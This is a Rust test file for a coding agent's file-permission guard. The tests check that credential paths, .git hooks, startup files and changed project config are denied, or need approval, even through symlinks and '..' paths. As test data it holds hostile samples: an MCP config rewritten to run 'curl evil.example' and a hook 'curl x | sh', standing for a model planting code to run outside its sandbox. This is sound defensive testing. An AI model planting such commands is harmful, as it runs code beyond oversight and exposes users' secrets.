//! Wave H lane `harden`: the file tools obey the sandbox's deny-list (pre-flight B3), the
//! project files that run outside the sandbox ask or are refused (B4 b/c), and trusted project
//! files load only as the user approved their content (B4 a).
//! Isolation: every path lives under `oxa_fake::TestEnv`.

use oxa_fake::TestEnv;
use oxa_perm::{deny_reasons, Approval, ModePolicy, PathGuard, TrustStore, APPROVED_KEY};
use oxa_proto::{Access, Decision, Mode, Policy};
use std::path::PathBuf;

fn guarded(env: &TestEnv) -> ModePolicy {
    let mut policy = ModePolicy::new().with_guard(PathGuard::new(
        &env.home(),
        &env.agent_dir(),
        &env.agent_dir().join("tmp"),
    ));
    policy.set_spill_dir(&env.agent_dir().join("tmp/s1"));
    policy
}

const SENSITIVE: Decision = Decision::Deny(deny_reasons::SENSITIVE);

#[test]
fn spill_read_exception_is_session_scoped_and_resolves_symlinks() {
    let env = TestEnv::new();
    let tmp = env.agent_dir().join("tmp");
    let spill = tmp.join("s1");
    std::fs::create_dir_all(&spill).unwrap();
    std::os::unix::fs::symlink(tmp.join("s2"), spill.join("other-session")).unwrap();
    std::os::unix::fs::symlink(env.home().join(".ssh"), spill.join("keys")).unwrap();
    let mut p = ModePolicy::new().with_guard(PathGuard::new(&env.home(), &env.agent_dir(), &tmp));
    let own = Access::Read(spill.join("out.txt"));
    assert_eq!(
        p.decide(Mode::Ask, &own, &env.work()),
        SENSITIVE,
        "no spill scope until the runtime attaches a session"
    );
    p.set_spill_dir(&spill);
    for mode in [Mode::Plan, Mode::Workspace, Mode::Ask] {
        assert_eq!(p.decide(mode, &own, &env.work()), Decision::Allow);
        for path in [
            tmp.join("s2/out.txt"),
            tmp.join("s1-other/out.txt"),
            tmp.join("codemode/out.txt"),
            spill.join("../s2/out.txt"),
            spill.join("other-session/out.txt"),
        ] {
            assert_eq!(
                p.decide(mode, &Access::Read(path.clone()), &env.work()),
                if path.starts_with(tmp.join("codemode")) {
                    Decision::Ask
                } else {
                    SENSITIVE
                },
                "only this session's spill reads without asking: {path:?} ({mode:?})"
            );
        }
        assert_eq!(
            p.decide(mode, &Access::Read(spill.join("keys/id_test")), &env.work()),
            SENSITIVE,
            "a spill symlink cannot bypass the deny-list"
        );
        assert_eq!(
            p.decide(mode, &Access::Write(spill.join("out.txt")), &env.work()),
            if mode == Mode::Plan {
                Decision::Deny(deny_reasons::PLAN_WRITE)
            } else {
                Decision::Ask
            }
        );
    }
    p.set_spill_dir(&tmp.join("s2"));
    assert_eq!(
        p.decide(Mode::Ask, &own, &env.work()),
        SENSITIVE,
        "switching replaces, rather than accumulates, the spill scope"
    );
    assert_eq!(
        p.decide(Mode::Ask, &Access::Read(tmp.join("s2/out.txt")), &env.work()),
        Decision::Allow
    );
}

#[test]
fn denied_paths_are_refused_in_every_mode_and_through_every_door() {
    let env = TestEnv::new();
    env.write("home/.ssh/id_test", "KEY");
    env.write("home/.oxa/agent/trust.json", "{}");
    let key = env.home().join(".ssh/id_test");
    let mut p = guarded(&env);
    for mode in [Mode::Plan, Mode::Workspace, Mode::Ask] {
        for a in [Access::Read(key.clone()), Access::Write(key.clone())] {
            assert_eq!(p.decide(mode, &a, &env.work()), SENSITIVE, "{mode:?} {a:?}");
        }
    }
    // The deny-list beats the cwd (oxa started in $HOME) and a remembered grant.
    p.remember(&Access::Read(env.home().join(".ssh/other")));
    assert_eq!(
        p.decide(Mode::Workspace, &Access::Read(key.clone()), &env.home()),
        SENSITIVE
    );
    // `..` from the project, and a symlink in the project, both land in a denied path.
    let dotdot = env.work().join("../home/.ssh/id_test");
    assert_eq!(
        p.decide(Mode::Workspace, &Access::Read(dotdot), &env.work()),
        SENSITIVE
    );
    std::os::unix::fs::symlink(env.home().join(".ssh"), env.work().join("keys")).expect("symlink");
    let via_link = env.work().join("keys/id_test");
    assert_eq!(
        p.decide(Mode::Workspace, &Access::Read(via_link.clone()), &env.work()),
        SENSITIVE
    );
    assert_eq!(
        p.decide(Mode::Workspace, &Access::Write(via_link), &env.work()),
        SENSITIVE
    );
    // A relative path is taken from the cwd.
    assert_eq!(
        p.decide(
            Mode::Workspace,
            &Access::Read(PathBuf::from("keys/id_test")),
            &env.work()
        ),
        SENSITIVE
    );
    // The agent directory is denied, its spill files (`tmp`) are not.
    assert_eq!(
        p.decide(
            Mode::Workspace,
            &Access::Read(env.agent_dir().join("trust.json")),
            &env.work()
        ),
        SENSITIVE
    );
    // #531: oxa's own spill file is readable without asking, in every mode (a headless run
    // answers every ask with "declined", and the truncation notice points the model at it).
    for mode in [Mode::Plan, Mode::Workspace, Mode::Ask] {
        assert_eq!(
            p.decide(
                mode,
                &Access::Read(env.agent_dir().join("tmp/s1/out.txt")),
                &env.work()
            ),
            Decision::Allow,
            "a spill file reads without asking ({mode:?})"
        );
    }
    // Other sessions remain denied even though the current spill is readable.
    assert_eq!(
        p.decide(
            Mode::Workspace,
            &Access::Read(env.agent_dir().join("tmp/s2/out.txt")),
            &env.work()
        ),
        SENSITIVE
    );
    // Writing outside the cwd still asks.
    assert_eq!(
        p.decide(
            Mode::Workspace,
            &Access::Write(env.agent_dir().join("tmp/s1/out.txt")),
            &env.work()
        ),
        Decision::Ask,
        "a spill file is not writable without asking"
    );
    // A plain file of the project is unaffected.
    assert_eq!(
        p.decide(
            Mode::Workspace,
            &Access::Write(env.work().join("a.txt")),
            &env.work()
        ),
        Decision::Allow
    );
}

/// #544: a denied directory does not cover a child's symlink target in the workspace.
#[test]
fn symlinked_oxc_credentials_are_denied() {
    for link_directory in [false, true] {
        let env = TestEnv::new();
        let llm = env.home().join(".config/oxc/llm");
        let credentials = env.work().join("credentials");
        let names = ["cloud-secrets.json", "chatgpt-auth.json"];
        for name in names {
            env.write(&format!("work/credentials/{name}"), "synthetic credential");
        }
        if link_directory {
            std::fs::create_dir_all(llm.parent().unwrap()).unwrap();
            std::os::unix::fs::symlink(&credentials, &llm).unwrap();
        } else {
            std::fs::create_dir_all(&llm).unwrap();
            for name in names {
                std::os::unix::fs::symlink(credentials.join(name), llm.join(name)).unwrap();
            }
        }
        let p = guarded(&env);
        for name in names {
            for path in [credentials.join(name), llm.join(name)] {
                for mode in [Mode::Plan, Mode::Workspace, Mode::Ask] {
                    for access in [Access::Read(path.clone()), Access::Write(path.clone())] {
                        assert_eq!(
                            p.decide(mode, &access, &env.work()),
                            SENSITIVE,
                            "directory link={link_directory}, {mode:?}, {access:?}"
                        );
                    }
                }
            }
        }
        // Naming a credential target must not restrict unrelated project files.
        for access in [
            Access::Read(credentials.join("notes.txt")),
            Access::Write(credentials.join("notes.txt")),
        ] {
            assert_eq!(p.decide(Mode::Workspace, &access, &env.work()), Decision::Allow);
        }
    }
}

#[test]
fn protected_project_files_ask_or_are_refused() {
    let env = TestEnv::new();
    let cwd = env.work();
    let mut p = guarded(&env);
    for rel in [
        ".oxa/mcp.json",
        ".oxa/settings.json",
        ".oxa/extensions/x.ts",
        ".agents/skills/s/SKILL.md",
    ] {
        let a = Access::Write(cwd.join(rel));
        assert_eq!(p.decide(Mode::Workspace, &a, &cwd), Decision::Ask, "{rel}");
        assert_eq!(p.decide(Mode::Ask, &a, &cwd), Decision::Ask, "{rel}");
        assert_eq!(
            p.decide(Mode::Plan, &a, &cwd),
            Decision::Deny(deny_reasons::PLAN_WRITE),
            "{rel}"
        );
        // A remembered grant does not turn these into Allow: every write asks.
        p.remember(&a);
        assert_eq!(
            p.decide(Mode::Workspace, &a, &cwd),
            Decision::Ask,
            "{rel} after a grant"
        );
        // Reading them is unchanged.
        assert_eq!(
            p.decide(Mode::Workspace, &Access::Read(cwd.join(rel)), &cwd),
            Decision::Allow
        );
    }
    for rel in [".git/hooks/pre-commit", ".git/config"] {
        let a = Access::Write(cwd.join(rel));
        for mode in [Mode::Plan, Mode::Workspace, Mode::Ask] {
            assert_eq!(
                p.decide(mode, &a, &cwd),
                Decision::Deny(deny_reasons::GIT_PROTECTED),
                "{rel} {mode:?}"
            );
        }
    }
    // `..` into the protected directory from a subdirectory is the same file.
    let sneaky = cwd.join("src/../.git/hooks/post-checkout");
    assert_eq!(
        p.decide(Mode::Workspace, &Access::Write(sneaky), &cwd),
        Decision::Deny(deny_reasons::GIT_PROTECTED)
    );
    // A symlink in the project pointing into .git/hooks too.
    std::fs::create_dir_all(cwd.join(".git/hooks")).unwrap();
    std::os::unix::fs::symlink(cwd.join(".git/hooks"), cwd.join("h")).unwrap();
    assert_eq!(
        p.decide(Mode::Workspace, &Access::Write(cwd.join("h/pre-push")), &cwd),
        Decision::Deny(deny_reasons::GIT_PROTECTED)
    );
}

#[test]
fn approval_follows_the_content() {
    let env = TestEnv::new();
    let cwd = env.work();
    let file = env.agent_dir().join("trust.json");
    env.write(
        "work/.oxa/mcp.json",
        r#"{"mcpServers":{"a":{"command":"echo","args":["one"]}}}"#,
    );
    env.write(
        "work/.oxa/settings.json",
        r#"{"theme":"dark","hooks":{"session_start":"true"}}"#,
    );
    let mut store = TrustStore::load(&file);
    store.save(&file, &cwd, true).unwrap();
    assert_eq!(store.approval(&cwd), Approval::NoRecord);
    assert!(
        store.trusted_as_approved(&cwd),
        "no record yet: the saved decision decides"
    );
    store.approve(&file, &cwd).unwrap();
    assert_eq!(TrustStore::load(&file).approval(&cwd), Approval::Matches);

    // A setting that runs nothing changes nothing.
    env.write(
        "work/.oxa/settings.json",
        r#"{"theme":"light","hooks":{"session_start":"true"}}"#,
    );
    assert_eq!(TrustStore::load(&file).approval(&cwd), Approval::Matches);

    // The model rewrites mcp.json and adds an extension.
    env.write(
        "work/.oxa/mcp.json",
        r#"{"mcpServers":{"a":{"command":"curl","args":["evil.example"]}}}"#,
    );
    env.write("work/.oxa/extensions/new.js", "export default function () {}");
    let store = TrustStore::load(&file);
    let Approval::Changed(changed) = store.approval(&cwd) else {
        panic!("a changed file needs a new approval");
    };
    let lines: Vec<String> = changed.iter().map(|c| c.line()).collect();
    assert_eq!(changed.len(), 2, "{lines:?}");
    assert!(
        lines
            .iter()
            .any(|l| l.contains("mcp.json (changed: MCP servers a: runs `curl evil.example`)")),
        "{lines:?}"
    );
    assert!(
        lines.iter().any(|l| l.contains("new.js (new: extension code")),
        "{lines:?}"
    );
    assert!(!store.trusted_as_approved(&cwd));

    // A changed hook command needs approval too.
    let mut store = store;
    store.approve(&file, &cwd).unwrap();
    env.write(
        "work/.oxa/settings.json",
        r#"{"theme":"light","hooks":{"session_start":"curl x | sh"}}"#,
    );
    assert!(matches!(
        TrustStore::load(&file).approval(&cwd),
        Approval::Changed(_)
    ));

    // The file stays pi's map of directories (the record under its own key), and a later
    // decision keeps the record.
    let text = std::fs::read_to_string(&file).unwrap();
    let v: serde_json::Value = serde_json::from_str(&text).unwrap();
    assert!(v.get(APPROVED_KEY).is_some_and(|x| x.is_object()), "{text}");
    let mut store = TrustStore::load(&file);
    store.save(&file, &env.root().join("other"), false).unwrap();
    let v: serde_json::Value = serde_json::from_str(&std::fs::read_to_string(&file).unwrap()).unwrap();
    assert!(v.get(APPROVED_KEY).is_some(), "save keeps the approvals");
    assert_eq!(TrustStore::load(&file).lookup(&cwd), Some(true));
}

/// O-199: with oxa started in `$HOME` (a home workspace), the file tools still ask before
/// writing what runs or configures something outside the sandbox later (shell startup files,
/// `~/.local/bin`, `~/.config/systemd`, `~/.oxa`, ...), also under YOLO; the home's folders
/// are the workspace. Keys stay denied.
#[test]
fn started_in_home_the_startup_files_ask_and_the_folders_are_the_workspace() {
    let env = TestEnv::new();
    env.write("home/.bashrc", "# rc\n");
    env.write("home/project/keep", "");
    env.write("home/.config/systemd/user/a.service", "");
    let home = env.home();
    let switch = oxa_proto::YoloSwitch::new(oxa_proto::Autonomy::Auto);
    for p in [guarded(&env), guarded(&env).with_yolo(switch)] {
        for rel in [
            ".bashrc",
            ".profile",
            ".bash_profile",
            ".zshrc",
            ".local/bin/tool",
            ".local/share/applications/a.desktop",
            ".config/systemd/user/a.service",
            ".config/autostart/a.desktop",
            ".config/hypr/hyprland.conf",
            ".oxa/settings.json",
            ".claude/settings.json",
            ".codex/config.toml",
            ".dsh/profiles/x",
            "bin/tool",
        ] {
            let a = Access::Write(home.join(rel));
            assert_eq!(p.decide(Mode::Workspace, &a, &home), Decision::Ask, "{rel}");
            assert_eq!(
                p.decide(Mode::Plan, &a, &home),
                Decision::Deny(deny_reasons::PLAN_WRITE),
                "{rel}"
            );
        }
        let a = Access::Write(home.join("project/x"));
        assert_eq!(p.decide(Mode::Workspace, &a, &home), Decision::Allow);
        let a = Access::Write(home.join(".ssh/authorized_keys"));
        assert_eq!(p.decide(Mode::Workspace, &a, &home), SENSITIVE);
        let a = Access::Read(home.join(".codex/auth.json"));
        assert_eq!(p.decide(Mode::Workspace, &a, &home), SENSITIVE);
    }
    // A project of its own under `~/.config` is still the user's workspace there.
    let p = guarded(&env);
    let nvim = home.join(".config/nvim");
    std::fs::create_dir_all(&nvim).unwrap();
    let a = Access::Write(nvim.join("init.lua"));
    assert_eq!(p.decide(Mode::Workspace, &a, &nvim), Decision::Allow);
}

#[test]
fn the_real_account_home_is_denied_as_well_as_a_changed_home() {
    let env = TestEnv::new();
    // `real` stands for the passwd home; `$HOME` points elsewhere (env.home()).
    let real = env.work().join("real-account-home");
    for rel in [
        ".ssh/id_synth",
        ".aws/credentials",
        ".config/gh/hosts.yml",
        ".gnupg/k",
    ] {
        env.write(&format!("work/real-account-home/{rel}"), "SYNTH");
    }
    let guard = PathGuard::with_real_home(
        &env.home(),
        Some(&real),
        &env.agent_dir(),
        &env.agent_dir().join("tmp"),
    );
    let p = ModePolicy::new().with_guard(guard);
    for home in [env.home(), real.clone()] {
        for rel in [".ssh/id_synth", ".aws/credentials", ".gnupg/k"] {
            for a in [Access::Read(home.join(rel)), Access::Write(home.join(rel))] {
                assert_eq!(p.decide(Mode::Workspace, &a, &env.work()), SENSITIVE, "{a:?}");
            }
        }
    }
}

/// #201 (2): one approved write to a file in the home still covers ordinary files of that
/// directory (usability first), but never the home's startup files, user units or
/// `~/.local/bin`, wherever the cwd is.
#[test]
fn a_grant_in_the_home_never_covers_its_startup_files_or_units() {
    let env = TestEnv::new();
    env.write("home/notes.txt", "n\n");
    env.write("home/.bashrc", "# rc\n");
    env.write("home/.config/systemd/user/a.service", "");
    env.write("home/.config/other.conf", "");
    let home = env.home();
    let cwd = env.work();
    let mut p = guarded(&env);
    let first = Access::Write(home.join("notes.txt"));
    assert_eq!(p.decide(Mode::Workspace, &first, &cwd), Decision::Ask);
    p.remember(&first);
    // Another ordinary file in the same directory: allowed without asking.
    let other = Access::Write(home.join("todo.txt"));
    assert_eq!(p.decide(Mode::Workspace, &other, &cwd), Decision::Allow);
    for rel in [
        ".bashrc",
        ".profile",
        ".zshrc",
        ".config/systemd/user/a.service",
        ".config/systemd/user/evil.service",
        ".local/bin/tool",
    ] {
        let a = Access::Write(home.join(rel));
        assert_eq!(p.decide(Mode::Workspace, &a, &cwd), Decision::Ask, "{rel}");
    }
    // A grant on the unit directory itself does not cover it either.
    let unit = Access::Write(home.join(".config/systemd/user/a.service"));
    p.remember(&unit);
    assert_eq!(p.decide(Mode::Workspace, &unit, &cwd), Decision::Ask);
    // An ordinary file under ~/.config after a grant there: still allowed.
    let cfg = Access::Write(home.join(".config/other.conf"));
    p.remember(&cfg);
    assert_eq!(
        p.decide(
            Mode::Workspace,
            &Access::Write(home.join(".config/new.conf")),
            &cwd
        ),
        Decision::Allow
    );
}

#[test]
fn git_worktree_common_dir_hooks_and_config_are_never_written() {
    let env = TestEnv::new();
    let main = env.work().join("main");
    let wt = env.work().join("wt");
    let wtgit = main.join(".git/worktrees/wt");
    std::fs::create_dir_all(main.join(".git/hooks")).unwrap();
    std::fs::create_dir_all(&wtgit).unwrap();
    std::fs::create_dir_all(&wt).unwrap();
    std::fs::write(wt.join(".git"), format!("gitdir: {}\n", wtgit.display())).unwrap();
    std::fs::write(wtgit.join("commondir"), "../..\n").unwrap();
    let p = guarded(&env);
    for f in [
        main.join(".git/hooks/pre-commit"),
        main.join(".git/config"),
        wtgit.join("config.worktree"),
        wtgit.join("hooks/pre-push"),
        wtgit.join("commondir"),
        wtgit.join("gitdir"),
    ] {
        for mode in [Mode::Workspace, Mode::Ask] {
            assert_eq!(
                p.decide(mode, &Access::Write(f.clone()), &wt),
                Decision::Deny(deny_reasons::GIT_PROTECTED),
                "{f:?} {mode:?}"
            );
        }
    }
    // Ordinary work in the worktree is unchanged.
    assert_eq!(
        p.decide(Mode::Workspace, &Access::Write(wt.join("src/a.rs")), &wt),
        Decision::Allow
    );
}

/// #201 (1): `.git/commondir` and `.git/gitdir` point git at another directory's hooks and
/// config, so the file tools never write them, like `.git/hooks` and `.git/config`.
#[test]
fn git_commondir_and_gitdir_are_refused_to_the_file_tools() {
    let env = TestEnv::new();
    let cwd = env.work();
    let p = guarded(&env);
    for rel in [".git/commondir", ".git/gitdir"] {
        let a = Access::Write(cwd.join(rel));
        for mode in [Mode::Plan, Mode::Workspace, Mode::Ask] {
            assert_eq!(
                p.decide(mode, &a, &cwd),
                Decision::Deny(deny_reasons::GIT_PROTECTED),
                "{rel} {mode:?}"
            );
        }
    }
    // Other files of `.git` are unchanged.
    let a = Access::Write(cwd.join(".git/description"));
    assert_eq!(p.decide(Mode::Workspace, &a, &cwd), Decision::Allow);
}

/// #201 (3): the baseline of a trusted project with no record yet, taken before tools run:
/// `.oxa` and `.agents/skills` content created afterwards is new, not part of the first record.
#[test]
fn a_baseline_makes_later_project_config_new() {
    let env = TestEnv::new();
    let cwd = env.work();
    let file = env.agent_dir().join("trust.json");
    let mut store = TrustStore::load(&file);
    store.save(&file, &cwd, true).unwrap();
    assert_eq!(store.approval(&cwd), Approval::NoRecord);
    assert!(store.record_baseline(&file, &cwd).unwrap(), "first record");
    assert_eq!(TrustStore::load(&file).approval(&cwd), Approval::Matches);
    // A second baseline never overwrites a record.
    env.write("work/.oxa/settings.json", r#"{"done":["echo planted"]}"#);
    env.write("work/.agents/skills/s/SKILL.md", "---\nname: s\n---\n");
    let mut store = TrustStore::load(&file);
    assert!(!store.record_baseline(&file, &cwd).unwrap());
    let Approval::Changed(changed) = TrustStore::load(&file).approval(&cwd) else {
        panic!("content created after the baseline needs the normal approval");
    };
    assert_eq!(changed.len(), 2, "{changed:?}");
    assert!(changed.iter().all(|c| c.new));
    assert!(!TrustStore::load(&file).trusted_as_approved(&cwd));
}

/// Review of #203: with `$HOME` overridden, a grant in the account's real home never covers
/// that home's startup files either.
#[test]
fn a_grant_in_the_real_home_never_covers_its_startup_files() {
    let env = TestEnv::new();
    let real = env.work().join("real-account-home");
    env.write("work/real-account-home/notes.txt", "n\n");
    env.write("work/real-account-home/.bashrc", "# rc\n");
    let guard = PathGuard::with_real_home(
        &env.home(),
        Some(&real),
        &env.agent_dir(),
        &env.agent_dir().join("tmp"),
    );
    let cwd = env.work().join("proj");
    let mut p = ModePolicy::new().with_guard(guard);
    let first = Access::Write(real.join("notes.txt"));
    assert_eq!(p.decide(Mode::Workspace, &first, &cwd), Decision::Ask);
    p.remember(&first);
    let rc = Access::Write(real.join(".bashrc"));
    assert_eq!(p.decide(Mode::Workspace, &rc, &cwd), Decision::Ask);
    let other = Access::Write(real.join("todo.txt"));
    assert_eq!(p.decide(Mode::Workspace, &other, &cwd), Decision::Allow);
}

#[test]
fn git_worktree_pointer_cannot_be_rewritten_and_fifo_dotgit_does_not_hang() {
    let env = TestEnv::new();
    let main = env.work().join("main");
    let wt = env.work().join("wt");
    let wtgit = main.join(".git/worktrees/wt");
    std::fs::create_dir_all(main.join(".git/hooks")).unwrap();
    std::fs::create_dir_all(&wtgit).unwrap();
    std::fs::create_dir_all(&wt).unwrap();
    std::fs::write(wt.join(".git"), format!("gitdir: {}\n", wtgit.display())).unwrap();
    let p = guarded(&env);
    assert_eq!(
        p.decide(Mode::Workspace, &Access::Write(wt.join(".git")), &wt),
        Decision::Deny(deny_reasons::GIT_PROTECTED)
    );
    // A `.git` FIFO must not block the check.
    let fifo = env.work().join("ff");
    std::fs::create_dir_all(&fifo).unwrap();
    let st = std::process::Command::new("mkfifo")
        .arg(fifo.join(".git"))
        .status()
        .unwrap();
    assert!(st.success());
    let (tx, rx) = std::sync::mpsc::channel();
    let (p2, f2) = (p.clone(), fifo.clone());
    std::thread::spawn(move || {
        let d = p2.decide(Mode::Workspace, &Access::Write(f2.join("a.rs")), &f2);
        let _ = tx.send(d);
    });
    let d = rx
        .recv_timeout(std::time::Duration::from_secs(10))
        .expect("hung on FIFO .git");
    assert_eq!(d, Decision::Allow);
}

#[test]
fn builtin_skills_are_readable_but_not_writable_by_tools() {
    let env = TestEnv::new();
    env.write("home/.oxa/agent/builtin-skills/pull-request/SKILL.md", "x");
    let skill = env.agent_dir().join("builtin-skills/pull-request/SKILL.md");
    let p = guarded(&env);
    // #492: the skill lives outside the cwd, yet reading it must not ask (a headless run
    // answers every ask with "declined"), in any mode.
    for mode in [Mode::Plan, Mode::Workspace, Mode::Ask] {
        assert_eq!(
            p.decide(mode, &Access::Read(skill.clone()), &env.work()),
            Decision::Allow,
            "{mode:?}"
        );
    }
    assert_eq!(
        p.decide(Mode::Workspace, &Access::Write(skill), &env.work()),
        SENSITIVE
    );
    let auth = env.agent_dir().join("auth.json");
    assert_eq!(
        p.decide(Mode::Workspace, &Access::Read(auth), &env.work()),
        SENSITIVE
    );
}

/// #522: the full output of a capped result is read without a question (an unattended run
/// cannot answer one), and only from the running session's spill directory.
#[test]
fn the_current_spill_directory_reads_without_asking_and_no_other_does() {
    let env = TestEnv::new();
    let mut p = guarded(&env);
    p.set_spill_dir(&env.agent_dir().join("tmp/s1"));
    let read = |rel: &str| Access::Read(env.agent_dir().join(rel));
    for mode in [Mode::Plan, Mode::Workspace, Mode::Ask] {
        assert_eq!(
            p.decide(mode, &read("tmp/s1/0123.txt"), &env.work()),
            Decision::Allow,
            "{mode:?}"
        );
    }
    assert!(
        !p.path_filter()
            .expect("guard")
            .hides(&env.agent_dir().join("tmp/s1/0123.txt")),
        "the walking tools must see the current session's spill files too"
    );
    assert_eq!(
        p.decide(Mode::Workspace, &read("tmp/s2/0123.txt"), &env.work()),
        SENSITIVE,
        "another session's spill file"
    );
    assert_eq!(
        p.decide(Mode::Workspace, &read("tmp/s1/../s2/0123.txt"), &env.work()),
        SENSITIVE,
        "`..` does not leave the spill directory"
    );
    assert_eq!(
        p.decide(Mode::Workspace, &read("trust.json"), &env.work()),
        SENSITIVE,
        "the rest of the agent directory"
    );
    // The exception is a read: a write there still asks outside the cwd.
    assert_eq!(
        p.decide(
            Mode::Workspace,
            &Access::Write(env.agent_dir().join("tmp/s1/x.txt")),
            &env.work()
        ),
        Decision::Ask
    );
    // A new session moves the exception.
    p.set_spill_dir(&env.agent_dir().join("tmp/s2"));
    assert_eq!(
        p.decide(Mode::Workspace, &read("tmp/s2/0123.txt"), &env.work()),
        Decision::Allow
    );
    assert_eq!(
        p.decide(Mode::Workspace, &read("tmp/s1/0123.txt"), &env.work()),
        SENSITIVE
    );
}

#[test]
fn inherited_spills_are_read_only_and_cannot_escape_or_survive_a_switch() {
    let env = TestEnv::new();
    env.write("home/.oxa/agent/tmp/source/out.txt", "synthetic output");
    env.write("home/.oxa/agent/tmp/unrelated/out.txt", "unrelated output");
    let source = env.agent_dir().join("tmp/source");
    let unrelated = env.agent_dir().join("tmp/unrelated/out.txt");
    let linked = source.join("linked.txt");
    std::os::unix::fs::symlink(&unrelated, &linked).unwrap();
    let mut p = guarded(&env).with_yolo(oxa_proto::YoloSwitch::new(true));
    p.set_spill_dir(&env.agent_dir().join("tmp/current"));
    p.set_inherited_spill_dirs(std::slice::from_ref(&source));
    for mode in Mode::ALL {
        assert_eq!(
            p.decide(mode, &Access::Read(source.join("out.txt")), &env.work()),
            Decision::Allow
        );
        for access in [
            Access::Write(source.join("out.txt")),
            Access::Read(unrelated.clone()),
            Access::Read(source.join("../unrelated/out.txt")),
            Access::Read(linked.clone()),
        ] {
            p.remember(&access);
            assert_eq!(
                p.decide(mode, &access, &env.work()),
                SENSITIVE,
                "{mode:?} {access:?}"
            );
        }
    }
    let filter = p.path_filter().unwrap();
    assert!(!filter.hides(&source.join("out.txt")));
    assert!(filter.hides(&unrelated));
    p.set_spill_dir(&env.agent_dir().join("tmp/new"));
    assert_eq!(
        p.decide(
            Mode::Workspace,
            &Access::Read(source.join("out.txt")),
            &env.work()
        ),
        SENSITIVE
    );
    assert!(p.path_filter().unwrap().hides(&source.join("out.txt")));
}
